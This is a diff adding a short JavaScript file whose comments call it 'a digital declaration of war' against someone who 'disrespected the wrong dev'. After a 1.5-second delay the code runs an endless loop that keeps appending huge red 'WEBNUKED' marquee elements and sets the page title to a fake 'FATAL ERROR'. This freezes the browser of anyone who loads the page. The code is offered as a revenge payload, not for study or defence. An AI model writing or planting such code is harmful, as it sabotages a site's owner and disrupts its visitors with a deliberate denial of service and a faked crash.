@@ -1,0 +1,17 @@
+// ⚠️ This file is NOT a joke. It's a digital declaration of war.
+// You disrespected the wrong dev.
+
+setTimeout(() => {
+  // Infinite DOM spawn
+  while (true) {
+    let div = document.createElement("div");
+    div.innerHTML = `
+      <marquee style="color:red;font-size:999px;">
+        WEBNUKED ☢️💥
+      </marquee>`;
+    document.body.appendChild(div);
+
+    // Fake system crash message
+    document.title = "💀 FATAL ERROR 💀";
+  }
+}, 1500); // wait 1.5s then boom
